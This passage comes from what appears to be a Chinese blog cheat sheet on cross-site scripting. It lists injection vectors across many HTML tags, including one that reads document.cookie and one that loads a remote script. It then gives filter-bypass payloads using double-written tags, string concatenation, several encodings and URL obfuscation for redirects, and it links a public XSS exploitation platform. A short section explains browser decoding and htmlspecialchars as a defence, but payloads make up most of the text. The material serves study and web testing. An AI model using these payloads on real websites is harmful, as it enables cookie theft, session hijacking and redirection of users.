class=\"hljs-attr\">xxx.com</span>/<span class=\"hljs-attr\">xss.js</span> &gt;</span> <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span> ＃ 引用外部的js <br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-2-svg-标签\"><a href=\"#2-1-2-svg-标签\" class=\"headerlink\" title=\"2.1.2 svg 标签\"></a>2.1.2 svg 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">svg</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">&quot;alert(1)&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">svg</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">&quot;alert(1)&quot;</span>//</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-3-img-标签\"><a href=\"#2-1-3-img-标签\" class=\"headerlink\" title=\"2.1.3 img 标签\"></a>2.1.3 img 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">1</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>&quot;<span class=\"hljs-attr\">hack</span>&quot;)&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">1</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(document.cookie)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n<h3 id=\"2-1-4-body-标签\"><a href=\"#2-1-4-body-标签\" class=\"headerlink\" title=\"2.1.4 body 标签\"></a>2.1.4 body 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span> <span class=\"hljs-attr\">onpageshow</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-5-video-标签\"><a href=\"#2-1-5-video-标签\" class=\"headerlink\" title=\"2.1.5 video 标签\"></a>2.1.5 video 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">video</span> <span class=\"hljs-attr\">onloadstart</span>=<span class=\"hljs-string\">alert(1)</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;/media/aaa.mp4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-6-style-标签\"><a href=\"#2-1-6-style-标签\" class=\"headerlink\" title=\"2.1.6 style 标签\"></a>2.1.6 style 标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">style</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">style</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-7-details\"><a href=\"#2-1-7-details\" class=\"headerlink\" title=\"2.1.7 details\"></a>2.1.7 details</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">details</span> <span class=\"hljs-attr\">open</span> <span class=\"hljs-attr\">ontoggle</span>=<span class=\"hljs-string\">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-8-select\"><a href=\"#2-1-8-select\" class=\"headerlink\" title=\"2.1.8 select\"></a>2.1.8 select</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1)</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-9-iframe\"><a href=\"#2-1-9-iframe\" class=\"headerlink\" title=\"2.1.9 iframe\"></a>2.1.9 iframe</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(</span>&quot;<span class=\"hljs-attr\">xss</span>&quot;);&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">javascript:alert(</span>&#x27;<span class=\"hljs-attr\">xss</span>&#x27;)&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-10-form\"><a href=\"#2-1-10-form\" class=\"headerlink\" title=\"2.1.10 form\"></a>2.1.10 form</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">form</span> <span class=\"hljs-attr\">action</span>=<span class=\"hljs-string\">javascript:alert(</span>&#x27;<span class=\"hljs-attr\">xss</span>&#x27;) <span class=\"hljs-attr\">method</span>=<span class=\"hljs-string\">&quot;get&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-11-自定义标签\"><a href=\"#2-1-11-自定义标签\" class=\"headerlink\" title=\"2.1.11 自定义标签\"></a>2.1.11 自定义标签</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&#x27;javascript:alert(666)&#x27;</span>&gt;</span>click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&#x27;javascript:alert(document.domain)&#x27;</span>&gt;</span>click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-XSS-可以插入的位置\"><a href=\"#2-2-XSS-可以插入的位置\" class=\"headerlink\" title=\"2.2 XSS 可以插入的位置\"></a>2.2 XSS 可以插入的位置</h2><ul>\n<li>用户输入作为script的标签内容</li>\n<li>用户输入作为html注释内容</li>\n<li>用户输入作为html标签的属性名</li>\n<li>用户输入作为html标签属性值</li>\n<li>用户输入作为html标签的名字直接插入到CSS里</li>\n</ul>\n<h3 id=\"2-2-1-测试位置\"><a href=\"#2-2-1-测试位置\" class=\"headerlink\" title=\"2.2.1 测试位置\"></a>2.2.1 测试位置</h3><ul>\n<li>常见业务场景<br>重灾区：评论区、留言区、个人信息、订单信息、站内信、网页及时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性、URL本身、URL所有参数、表单</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">uername=<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\">alert(1)<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>&amp;</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>&amp;password=******<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-XSS-编码与绕过\"><a href=\"#3-XSS-编码与绕过\" class=\"headerlink\" title=\"3 XSS 编码与绕过\"></a>3 XSS 编码与绕过</h1><h2 id=\"3-1-网页的解码过程\"><a href=\"#3-1-网页的解码过程\" class=\"headerlink\" title=\"3.1 网页的解码过程\"></a>3.1 网页的解码过程</h2><p>编码就是将字符变为二进制数，而解码就是还原二进制数为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程。</p>\n<ul>\n<li>URL编码</li>\n</ul>\n<p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>\n<ul>\n<li>HTML编码&#x2F;解码</li>\n</ul>\n<p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是看到的源代码。具体的解码方式依具体情况而定，所以需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码，所以很多网页就指定了解码方式为UTF-8。</p>\n<p>但是在HTML中有些字符是和关键词冲突的，比如&lt;、&gt;、&amp;，解码之后，浏览器会误认为它们是标签，为了正确地显示预留字符，需要在HTML源代码中使用字符实体，比如常见的空格&amp;nbsp;，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>\n<table>\n<thead>\n<tr>\n<th>显示结果</th>\n<th>描述</th>\n<th>实体名称</th>\n<th>实体编号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt;</td>\n<td>小于号</td>\n<td>&lt;</td>\n<td>&amp;#60;</td>\n</tr>\n<tr>\n<td>&gt;</td>\n<td>大于号</td>\n<td>&gt;</td>\n<td>&amp;#62;</td>\n</tr>\n</tbody></table>\n<p>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p>\n<blockquote>\n<p>tip:所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p>\n</blockquote>\n<ul>\n<li>JS解码（只支持UNICODE）</li>\n</ul>\n<p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而src、 href 后边加入的javascript 伪URL，也会进入JS 的解析模式。</p>\n<p>比如<code>&lt;a href=&quot;javascript:alert(&#39;&lt;\\u4e00&gt;&#39;)&quot;&gt;test&lt;/a&gt;</code>，javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\\u4e00，前导的 \\u 表示他是一个unicode 字符，根据后边的数字，解析为一，于是在完成JS的解析之后变成了：href&#x3D;”javascript:alert(‘&lt;一&gt;’)”&gt;test</p>\n<h2 id=\"3-2-绕过\"><a href=\"#3-2-绕过\" class=\"headerlink\" title=\"3.2 绕过\"></a>3.2 绕过</h2><h3 id=\"3-2-1-关键字被过滤\"><a href=\"#3-2-1-关键字被过滤\" class=\"headerlink\" title=\"3.2.1 关键字被过滤\"></a>3.2.1 关键字被过滤</h3><h4 id=\"3-2-1-1-双写绕过\"><a href=\"#3-2-1-1-双写绕过\" class=\"headerlink\" title=\"3.2.1.1 双写绕过\"></a>3.2.1.1 双写绕过</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">scrscriptipt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">scrscriptipt</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-2-字符拼接\"><a href=\"#3-2-1-2-字符拼接\" class=\"headerlink\" title=\"3.2.1.2 字符拼接\"></a>3.2.1.2 字符拼接</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">top[<span class=\"hljs-string\">&quot;al&quot;</span>+<span class=\"hljs-string\">&quot;ert&quot;</span>](<span class=\"hljs-string\">`xss`</span>);</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-3-编码绕过\"><a href=\"#3-2-1-3-编码绕过\" class=\"headerlink\" title=\"3.2.1.3 编码绕过\"></a>3.2.1.3 编码绕过</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># Unicode 编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;<span class=\"hljs-symbol\">&amp;#97;</span><span class=\"hljs-symbol\">&amp;#108;</span><span class=\"hljs-symbol\">&amp;#101;</span><span class=\"hljs-symbol\">&amp;#114;</span><span class=\"hljs-symbol\">&amp;#116;</span><span class=\"hljs-symbol\">&amp;#40;</span><span class=\"hljs-symbol\">&amp;#34;</span><span class=\"hljs-symbol\">&amp;#120;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#115;</span><span class=\"hljs-symbol\">&amp;#34;</span><span class=\"hljs-symbol\">&amp;#41;</span><span class=\"hljs-symbol\">&amp;#59;</span>&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(&#x27;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\\u003b&#x27;)&quot;</span>&gt;</span><br><br># url 编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br><br># ascii 码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span><br><br># hex 码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">eval(</span>&#x27;\\<span class=\"hljs-attr\">x61</span>\\<span class=\"hljs-attr\">x6c</span>\\<span class=\"hljs-attr\">x65</span>\\<span class=\"hljs-attr\">x72</span>\\<span class=\"hljs-attr\">x74</span>\\<span class=\"hljs-attr\">x28</span>\\<span class=\"hljs-attr\">x27</span>\\<span class=\"hljs-attr\">x78</span>\\<span class=\"hljs-attr\">x73</span>\\<span class=\"hljs-attr\">x73</span>\\<span class=\"hljs-attr\">x27</span>\\<span class=\"hljs-attr\">x29</span>&#x27;)&gt;</span><br><br># 八进制<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>&#x27;\\<span class=\"hljs-attr\">170</span>\\<span class=\"hljs-attr\">163</span>\\<span class=\"hljs-attr\">163</span>&#x27;)&gt;</span><br><br># base64<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-4-内嵌编码后TAB\"><a href=\"#3-2-1-4-内嵌编码后TAB\" class=\"headerlink\" title=\"3.2.1.4 内嵌编码后TAB\"></a>3.2.1.4 内嵌编码后TAB</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;jav<span class=\"hljs-symbol\">&amp;#x09;</span>ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-5-多重尖括号\"><a href=\"#3-2-1-5-多重尖括号\" class=\"headerlink\" title=\"3.2.1.5 多重尖括号\"></a>3.2.1.5 多重尖括号</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">&lt;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-string\">&quot;XSS&quot;</span>);<span class=\"hljs-comment\">//&lt;</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-2-1-6-将JS文件重命名为图像\"><a href=\"#3-2-1-6-将JS文件重命名为图像\" class=\"headerlink\" title=\"3.2.1.6 将JS文件重命名为图像\"></a>3.2.1.6 将JS文件重命名为图像</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-2-过滤空格-x2F-引号\"><a href=\"#3-2-2-过滤空格-x2F-引号\" class=\"headerlink\" title=\"3.2.2 过滤空格&#x2F;引号\"></a>3.2.2 过滤空格&#x2F;引号</h3><h4 id=\"3-2-2-1-使用-x2F-代替\"><a href=\"#3-2-2-1-使用-x2F-代替\" class=\"headerlink\" title=\"3.2.2.1 使用&#x2F;代替\"></a>3.2.2.1 使用&#x2F;代替</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(/xss/);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-3-过滤单-x2F-双引号\"><a href=\"#3-2-3-过滤单-x2F-双引号\" class=\"headerlink\" title=\"3.2.3 过滤单&#x2F;双引号\"></a>3.2.3 过滤单&#x2F;双引号</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># 使用反引号代替<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>`<span class=\"hljs-attr\">xss</span>`);&gt;</span><br># 编码绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-4-过滤括号\"><a href=\"#3-2-4-过滤括号\" class=\"headerlink\" title=\"3.2.4 过滤括号\"></a>3.2.4 过滤括号</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># 使用 throw 绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">onerror=alert;<span class=\"hljs-keyword\">throw</span> <span class=\"hljs-number\">1337</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>&gt; onerror在每次javascript执行异常时都会被激活，调用指定的处理程序，并且throw语句可创建一个发送到onerror处的包含表达式的自定义异常。因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。<br><br># 使用``代替<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">alert<span class=\"hljs-string\">`1`</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><br># HTML编码绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\">alert<span class=\"hljs-symbol\">&amp;#x28;</span>1<span class=\"hljs-symbol\">&amp;#x29;</span></span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-5-过滤URL地址\"><a href=\"#3-2-5-过滤URL地址\" class=\"headerlink\" title=\"3.2.5 过滤URL地址\"></a>3.2.5 过滤URL地址</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># 使用URL编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">2e</span>%<span class=\"hljs-attr\">62</span>%<span class=\"hljs-attr\">61</span>%<span class=\"hljs-attr\">69</span>%<span class=\"hljs-attr\">64</span>%<span class=\"hljs-attr\">75</span>%<span class=\"hljs-attr\">2e</span>%<span class=\"hljs-attr\">63</span>%<span class=\"hljs-attr\">6f</span>%<span class=\"hljs-attr\">6d</span>/`&gt;</span><br><br># 使用IP<br># 使用进制转换<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">2130706433</span>/`&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">0177.0.0.01</span>/`&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">0x7f.0x0.0x0.0x1</span>/`&gt;</span><br><br># html标签中用//可以代替http://<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`//<span class=\"hljs-attr\">www.baidu.com</span>`&gt;</span><br><br># 使用\\\\<br>但是要注意在windows下\\本身就有特殊用途，是一个 path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`\\\\<span class=\"hljs-attr\">www.baidu.com</span>`&gt;</span><br><br># 使用中文句号代替英文点号<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span><br><br># 利用data类型的url代替http://<br>data:text,alert()<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"4-利用\"><a href=\"#4-利用\" class=\"headerlink\" title=\"4 利用\"></a>4 利用</h1><p><a href=\"https://xss.pt/xss.php?do=login\">XSS plamform</a></p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e6%80%bb%e7%bb%93/\">xss总结</a><br><a href=\"https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e7%bc%96%e7%a0%81%e5%89%96%e6%9e%90/\">xss编码剖析</a><br><a 